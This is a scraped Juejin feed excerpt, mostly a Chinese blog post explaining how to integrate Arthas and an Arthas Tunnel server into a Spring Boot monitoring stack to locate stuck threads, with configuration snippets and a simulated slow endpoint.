<p>ast-grep 支持在命令行和规则层双重覆写解析语言，这让你可以在混合文件中对脚本部分进行结构化搜索。但解析器能力是天花板：当模板/脚本语法不被支持时（如 Pug + TSX），需要先裁剪输入或更换解析器，否则只能退化为文本匹配。按照本文的命令与配置示例，可以快速在 Vue 项目里对脚本逻辑做 TS/TSX/JSX 级别的精确查询，而不必等待默认解析器完善。***</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于arthas量化监控诊断java应用方法论与实践]]></title>    <link>https://juejin.cn/post/7580623265791868966</link>    <guid>https://juejin.cn/post/7580623265791868966</guid>    <pubDate>2025-12-08T01:47:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580623265791868966" data-draft-id="7580621397971779593" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 基于arthas量化监控诊断java应用方法论与实践"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-08T01:47:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="shark_chili"/> <meta itemprop="url" content="https://juejin.cn/user/2858385964801672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             基于arthas量化监控诊断java应用方法论与实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2858385964801672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    shark_chili
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T01:47:20.000Z" title="Mon Dec 08 2025 01:47:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">写在文章开头</h2>
<p>应用系统监控也是软件研发中最重要的一环，从研发的角度来说，明确指出自己业务维度明确指出个人负责功能业务维度的系统监控指标，同时具备实时监控诊断的应对方法，是软件架构成功的重要的一环。所以本文将针对故障和监控两个重要概念展开探讨，同时给出一种理想化的架构结合实践案例基于参考，希望对你有所帮助。</p>
<p>我是 <strong>SharkChili</strong> ，Java 开发者，<strong>Java Guide</strong> 开源项目维护者。欢迎关注我的公众号：<strong>写代码的SharkChili</strong>，也欢迎您了解我的开源项目 mini-redis：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshark-ctrl%2Fmini-redis" target="_blank" title="https://github.com/shark-ctrl/mini-redis" ref="nofollow noopener noreferrer">github.com/shark-ctrl/…</a>。</p>
<p>为方便与读者交流，现已创建读者群。关注下方公众号获取我的联系方式，添加时备注<strong>加群</strong>即可加入。</p>
<h2 data-id="heading-1">浅谈监控的基本概念</h2>
<h3 data-id="heading-2">故障的生命周期</h3>
<p>故障的生命周期分为以下几个阶段：</p>
<ol>
<li>故障开始</li>
<li>故障发现</li>
<li>故障定位</li>
<li>及时修复</li>
<li>系统恢复</li>
</ol>
<p>这其中，故障发现和通知在市面上已经有一套相对成熟的体系参考，无论是运维还是研发总会有一套自己系统监控的理论，并在应用中完成运用实现监控和告警。 那么问题来了，从研发的角度，针对系统监控各项性能指标，如何明确定位到具体的错误？例如：</p>
<ol>
<li>系统提示CPU飙升，面对宏观的性能指标，我们如何知晓故障线程？</li>
<li>web请求全体夯死，系统监控全面告知线程处于<code>wating</code>状态，我们如何定位到问题的根因并优化？</li>
<li>程序堆内存飙升达到与之，我们如何定位到进程级别的具体问题对象从而定位到问题的栈帧？</li>
</ol>
<p>如下图，这就是笔者面板中最常见的容器线程直线飙升导致大量请求夯死超时，按照现有体系中的<code>grafana</code>监控面板，面对成百上千的接口请求，即时我们能够准确的做到故障发现，也无法非常快速精准的做到故障定位： <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cad3533052241a2a264fdb8fc6136e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=odgWKC81oPOZ681Zxx%2F6rd6apGI%3D" alt="" loading="lazy"/></p>
<p>缺少精准的定位动作，就看导致止损动作对故障恢复没有任何帮助，就需要进行重新定位，进而导致负责人员花费大量时间在故障发现和止损动作之间循环往复的执行。</p>
<h3 data-id="heading-3">笔者理想中的监控体系</h3>
<p>监控是可以确保提前暴露被即时发现解决，同时也可以作为日常循环后系统调优的佐证。所以量化一切监控体系之后，我们就需要搭建一个完善、安全、成熟的监控诊断体系来排查定位问题， 以笔者研发的java应用为例，主流的应用监控会通过<code>micrometer</code>采集目标监控指标，并将其同步到<code>prometheus</code>并通过<code>grafana</code>进行增强渲染，在此基础之上通过<code>Nightingale</code>针对这些告急的监控及时下发企微消息或者短信告警让研发人员介入解决问题：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c612b55ec334569aad2c1f91a83d5b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=cQ09K6qFBM1BQA6J8%2BF8FY%2FK7jg%3D" alt="" loading="lazy"/></p>
<p>按照笔者上面的说法，这种做法存在如下几个问题：</p>
<ol>
<li>市面仅仅指定常见系统级别监控指标，粒度在如今的应用系统中显得过于宽泛</li>
<li>团队指定指标往往会因为各种原因无法精准、明确，可快速定位检索各种异常和监控故障的应用级别监控指标</li>
<li><code>grafana</code>和<code>Nightingale</code>是面向于运维和研发的通用，且着重于监控可视化和阈值告警，并不能很好的做到监控诊断。</li>
</ol>
<p>所以，在此基础之上笔者也给出了一套基于自己常见的工具所衍生了一套带有监控诊断的监控运维体系架构，即在上述监控体系下集成强阿里系中强大的监控诊断工具<code>arthas</code>。</p>
<p>如下图，在这套监控体系下，通过<code>arthas tunel</code>远程统一管理所有被<code>arthas agent</code>代理的<code>java</code>应用程序，当其他监控运维工具感知异常时，我们就可以快速通过浏览器<code>attach</code>到存在故障的进程中，以超细粒度灵活的指令和表达式定位<code>java</code>程序中对象内存占用、<code>CPU</code>利用率甚至是栈帧的调用细节：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d16475d745142dba0c9539811b9b27d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=HZN2ZDsdPc06UiGPQVD10OuhxQ8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">基于arhtas的应用远程监控实践</h2>
<h3 data-id="heading-5">arthas监控诊断体系说明</h3>
<p>基于上述的说明，我们大体了解的监控诊断的一套理想架构，而本文将针对该架构进行演示和实践，按照<code>arthas</code>官网的说明，对于<code>spring boot</code>项目，我们在项目中引入<code>arthas-spring-boot-starter</code>，其底层会启动一个<code>arthas</code>进程并<code>attach</code>到装配的应用上，由此构建出当前服务的<code>arthas agent</code>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/787857bb19af4cd48fb2ede90247be75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=ABMMMMRcH5VrJSpUbt9YGbPGiK8%3D" alt="" loading="lazy"/></p>
<p>这一点，我们可以通过<code>ArthasConfiguration</code>的<code>arthasAgent</code>这个<code>bean</code>得以印证，可以看到它会拉取<code>spring boot</code>配置后，通过这个配置构建<code>arthasAgent</code>并调用init完成如下工作：</p>
<ol>
<li>通过<code>Instrumentation</code>注册字节码转换器即<code>ClassFileTransformer</code>，后续通过该技术实现类加载或者运行时字节码动态增强</li>
<li>拉取一个<code>artahs agent</code>并<code>attach</code>到当前进程构成<code>artahs</code>服务端，监听客户端指令完成目标类增强：</li>
</ol>
<p>对应笔者也给出这段源码的视线入口，读者可以自行参阅：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@ConditionalOnMissingBean</span>
 <span class="hljs-variable">@Bean</span>
 public ArthasAgent <span class="hljs-built_in">arthasAgent</span>(<span class="hljs-variable">@Autowired</span> Map&lt;String, String&gt; arthasConfigMap,
   <span class="hljs-variable">@Autowired</span> ArthasProperties arthasProperties) throws Throwable {
  <span class="hljs-selector-tag">arthasConfigMap</span> = <span class="hljs-selector-tag">StringUtils</span><span class="hljs-selector-class">.removeDashKey</span>(arthasConfigMap);
  <span class="hljs-comment">// 给配置全加上前缀</span>
  <span class="hljs-selector-tag">Map</span>&lt;<span class="hljs-selector-tag">String</span>, <span class="hljs-selector-tag">String</span>&gt; <span class="hljs-selector-tag">mapWithPrefix</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">HashMap</span>&lt;<span class="hljs-selector-tag">String</span>, <span class="hljs-selector-tag">String</span>&gt;(arthasConfigMap.<span class="hljs-built_in">size</span>());
  <span class="hljs-selector-tag">for</span> (Entry&lt;String, String&gt; <span class="hljs-attribute">entry </span>: arthasConfigMap.<span class="hljs-built_in">entrySet</span>()) {
   <span class="hljs-selector-tag">mapWithPrefix</span><span class="hljs-selector-class">.put</span>(<span class="hljs-string">"arthas."</span> + entry.<span class="hljs-built_in">getKey</span>(), entry.<span class="hljs-built_in">getValue</span>());
  }
  <span class="hljs-comment">//基于配置完成构建artahs agent，完成arthas agent服务端初始化，监听客户端指令完成字节码增强</span>
  
  <span class="hljs-selector-tag">final</span> <span class="hljs-selector-tag">ArthasAgent</span> <span class="hljs-selector-tag">arthasAgent</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">ArthasAgent</span>(mapWithPrefix, arthasProperties.<span class="hljs-built_in">getHome</span>(),
    arthasProperties.<span class="hljs-built_in">isSlientInit</span>(), null);

  <span class="hljs-selector-tag">arthasAgent</span><span class="hljs-selector-class">.init</span>();
  <span class="hljs-selector-tag">logger</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"Arthas agent start success."</span>);
  <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">arthasAgent</span>;

 }
</code></pre>
<p>同时，考虑到当前应用体系下成百个服务，我们需要有一个统一的入口集中化监控管理，所以为了能够有一个统一的入口集中管理所有的agent，我们会专门用一台与外界隔离的服务器部署一个<code>Arthas Tunnel</code>，让所有的应用程序生成agent后统一与tunel建立连接，后续我们就可以通过<code>tunel</code>暴露的端口，统一管理监控诊断存在异常风险的应用程序：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61693d0d1ae5437eacf461d005187f13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=JfxT6fHRpgk%2FBLoCceRSYRrgqsU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">项目中集成arthas</h3>
<p>对于需要<code>arthas agent</code>的程序，我们首先需要引入<code>arthas</code> 脚手架依赖包：</p>
<pre><code class="hljs language-xml" lang="xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.taobao.arthas<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>arthas-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>然后配置agent唯一id并指定tunel的注册地址(默认暴露端口为7777)：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">arthas.agent-id</span>=hsehdfsfghhwertyfad
<span class="hljs-attr">arthas.tunnel-server</span>=ws://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span>/ws
</code></pre>
<p>随后我们到官网下载并启动tunel</p>
<pre><code class="hljs language-vbscript" lang="vbscript">java -jar arthas-tunnel-<span class="hljs-built_in">server</span><span class="hljs-number">-4.1</span><span class="hljs-number">.2</span>-fatjar.jar
</code></pre>
<p>此时我们就可以启动我们的java程序了，控制台出现如下提示，则说明服务启动并成功注册到arthas了：</p>
<pre><code class="hljs language-ini" lang="ini">2025-12-07 22:09:21.370  INFO 68696 --- <span class="hljs-section">[           main]</span> c.a.arthas.spring.ArthasConfiguration    : Arthas agent start success.
2025-12-07 22:09:21.483  INFO 68696 --- <span class="hljs-section">[           main]</span> o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 18080 (http)
</code></pre>
<p>此时键入<a href="https://link.juejin.cn?target=http%3A%2F%2F127.0.0.1%3A8080%2F%25E5%258D%25B3%25E5%258F%25AF%25E8%25BF%259B%25E5%2585%25A5tunel%25E9%259D%25A2%25E6%259D%25BF%25EF%25BC%258C%25E9%2594%25AE%25E5%2585%25A5%25E5%2588%259A%25E5%2588%259A%25E7%259A%2584agentid%25E5%258D%25B3%25E5%258F%25AF%25E7%259B%25B4%25E6%258E%25A5%25E8%25BF%259B%25E5%2585%25A5%25E7%259B%2591%25E6%258E%25A7%25E9%259D%25A2%25E6%259D%25BF%25EF%25BC%259A" target="_blank" title="http://127.0.0.1:8080/%E5%8D%B3%E5%8F%AF%E8%BF%9B%E5%85%A5tunel%E9%9D%A2%E6%9D%BF%EF%BC%8C%E9%94%AE%E5%85%A5%E5%88%9A%E5%88%9A%E7%9A%84agentid%E5%8D%B3%E5%8F%AF%E7%9B%B4%E6%8E%A5%E8%BF%9B%E5%85%A5%E7%9B%91%E6%8E%A7%E9%9D%A2%E6%9D%BF%EF%BC%9A" ref="nofollow noopener noreferrer">http://127.0.0.1:8080/即可进入tunel面板，键入刚刚的agentid即可直接进入监控面板：</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/843ea13ab4da4af6ae0f2a1850a9c556~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=7TwsWarlmkVtoyycunS5EwH054A%3D" alt="" loading="lazy"/></p>
<p>这里补充说明一下感兴趣的读者可以到官网拉取<code>arhtas</code>的源码包，以笔者为例这里选择<code>arhtas-all-3.6.0</code>版本，并在配置文件中关闭<code>redis</code>监控，避免本机没有redis服务端连接导致自动装配阶段报错：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">management.health.redis.enabled</span>=<span class="hljs-literal">false</span>
</code></pre>
<p>通过运行<code>ArthasTunnelApplication</code>将<code>tunel</code>启动：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/555607535ab84d90a010f89a50e35316~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=V6uUH8y9IWbhyoiTBYwrqgrvAho%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">arthas tunel系统架构监控实践</h3>
<p>回到最早的问题，面对大量飙升处于<code>wating</code>状态的线程因为监控工具和指标的局限性而发做到快速的监控诊断，有了<code>arthas</code>监控诊断体系架构，笔者用下面这样的一个接口模拟一个存在问题的分页查询并演示一下快速的解决步骤：</p>
<pre><code class="hljs language-typescript" lang="typescript"> <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/slow-request"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> <span class="hljs-title function_">handleUserPageQuery</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 调用service的用户分页列表查询方法</span>
        <span class="hljs-keyword">return</span> userService.<span class="hljs-title function_">getUserPageList</span>();
    }
</code></pre>
<p>查看<code>UserService</code>的<code>getUserPageList</code>，可以看到其内部用休眠模拟分页查询的长耗时：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> <span class="hljs-title function_">getUserPageList</span>(<span class="hljs-params"/>) {
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"开始查询用户分页列表"</span>);
        
        <span class="hljs-comment">// 模拟耗时的用户分页列表查询，休眠1分钟</span>
        <span class="hljs-title class_">ThreadUtil</span>.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">DAYS</span>);
        
        <span class="hljs-comment">// 构造分页列表结果</span>
        <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span>();
        result.<span class="hljs-title function_">set</span>(<span class="hljs-string">"code"</span>, <span class="hljs-number">200</span>);
        result.<span class="hljs-title function_">set</span>(<span class="hljs-string">"message"</span>, <span class="hljs-string">"success"</span>);
        <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span>();
        data.<span class="hljs-title function_">set</span>(<span class="hljs-string">"total"</span>, <span class="hljs-number">100</span>);
        data.<span class="hljs-title function_">set</span>(<span class="hljs-string">"pageSize"</span>, <span class="hljs-number">10</span>);
        data.<span class="hljs-title function_">set</span>(<span class="hljs-string">"currentPage"</span>, <span class="hljs-number">1</span>);
        <span class="hljs-comment">// 模拟用户列表数据</span>
        <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span>();
        user1.<span class="hljs-title function_">set</span>(<span class="hljs-string">"id"</span>, <span class="hljs-number">1</span>);
        user1.<span class="hljs-title function_">set</span>(<span class="hljs-string">"name"</span>, <span class="hljs-string">"张三"</span>);
        user1.<span class="hljs-title function_">set</span>(<span class="hljs-string">"email"</span>, <span class="hljs-string">"zhangsan@example.com"</span>);
        
        <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> user2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span>();
        user2.<span class="hljs-title function_">set</span>(<span class="hljs-string">"id"</span>, <span class="hljs-number">2</span>);
        user2.<span class="hljs-title function_">set</span>(<span class="hljs-string">"name"</span>, <span class="hljs-string">"李四"</span>);
        user2.<span class="hljs-title function_">set</span>(<span class="hljs-string">"email"</span>, <span class="hljs-string">"lisi@example.com"</span>);
        
        data.<span class="hljs-title function_">set</span>(<span class="hljs-string">"users"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span>[]{user1, user2});
        result.<span class="hljs-title function_">set</span>(<span class="hljs-string">"data"</span>, data);
        
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"用户分页列表查询完成"</span>);
        <span class="hljs-keyword">return</span> result;
    }
</code></pre>
<p>通过上文的<code>tunel</code>入口，我们很快的进入到程序内部，简单快速的定位的<code>tomcat</code>那些存在<code>time</code> <code>wating</code>的问题线程：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/199a86aa30084eb39cdd5b7165209925~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=evmPrtxghNJKC845apeOyVDKD6s%3D" alt="" loading="lazy"/></p>
<p>非常简单干脆的定位到了问题线程的栈帧，很好的完成监控体系中的监控诊断这一步：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/327cbc675b1446cc9b647188a92e1285~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2hhcmtfY2hpbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763240&amp;x-signature=OYYDK4ttYLfS2Z%2BDQDsKxaspObU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">小结</h2>
<p>笔者认为，一个健壮的系统运维监控体系是着重于强调量化且可感知观测的，在日常工作的对接中，我发现大量研发人员都有一种计算机文科化的趋势，小到应用程序指标调测，达到故障定位暴力迭代结合日志盲目推测。 结合这些问题，笔者通过这篇文章给出一个理想的监控体系，也希望对读者有所启发。</p>
<p>我是 <strong>SharkChili</strong> ，Java 开发者，<strong>Java Guide</strong> 开源项目维护者。欢迎关注我的公众号：<strong>写代码的SharkChili</strong>，也欢迎您了解我的开源项目 mini-redis：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshark-ctrl%2Fmini-redis" target="_blank" title="https://github.com/shark-ctrl/mini-redis" ref="nofollow noopener noreferrer">github.com/shark-ctrl/…</a>。</p>
<p>为方便与读者交流，现已创建读者群。关注下方公众号获取我的联系方式，添加时备注<strong>加群</strong>即可加入。</p>
<p>我是 SharkChili ，Java 开发者，Java Guide 开源项目维护者。欢迎关注我的公众号：写代码的SharkChili，也欢迎您了解我的开源项目 mini-redis：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshark-ctrl%2Fmini-redis%25E3%2580%2582" target="_blank" title="https://github.com/shark-ctrl/mini-redis%E3%80%82" ref="nofollow noopener noreferrer">github.com/shark-ctrl/…</a></p>
<p>为方便与读者交流，现已创建读者群。关注上方公众号获取我的联系方式，添加时备注加群即可加入。</p>
<h2 data-id="heading-9">参考</h2>
<p>阿里Arthas深度详解：从底层原理到生产实战，Java问题排查不再愁：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fjam_yin%2Farticle%2Fdetails%2F155359238%23%3A~%3Atext%3DArthas%25E7%259A%2584%25E5%25B7%25A5%25E4%25BD%259C%25E5%258E%259F%25E7%2590%2586%25E6%259C%25AC%25E8%25B4%25A8%25E6%2598%25AF%25E2%2580%259CAttach%25E6%259C%25BA%25E5%2588%25B6%25E6%25B3%25A8%25E5%2585%25A5%25E4%25BB%25A3%25E7%2590%2586%2520%252B%2520Instrumentation%25E5%25AE%259E%25E7%258E%25B0%25E5%25AD%2597%25E8%258A%2582%25E7%25A0%2581%25E5%25A2%259E%25E5%25BC%25BA%25E2%2580%259D%25E7%259A%2584%25E7%25BB%2584%25E5%2590%2588%25EF%25BC%258C%25E6%2595%25B4%25E4%25BD%2593%25E6%25B5%2581%25E7%25A8%258B%25E5%25A6%2582%25E4%25B8%258B%25EF%25BC%259A%25204.%2CArthas%25E6%25A0%25B8%25E5%25BF%2583%25E6%259E%25B6%25E6%259E%2584%25E8%25A7%25A3%25E6%259E%2590%2520Arthas%25E9%2587%2587%25E7%2594%25A8%25E2%2580%259C%25E5%25AE%25A2%25E6%2588%25B7%25E7%25AB%25AF-%25E6%259C%258D%25E5%258A%25A1%25E7%25AB%25AF%25E2%2580%259D%25E6%259E%25B6%25E6%259E%2584%25EF%25BC%258C%25E5%2588%2586%25E4%25B8%25BA%25E4%25B8%2589%25E5%25A4%25A7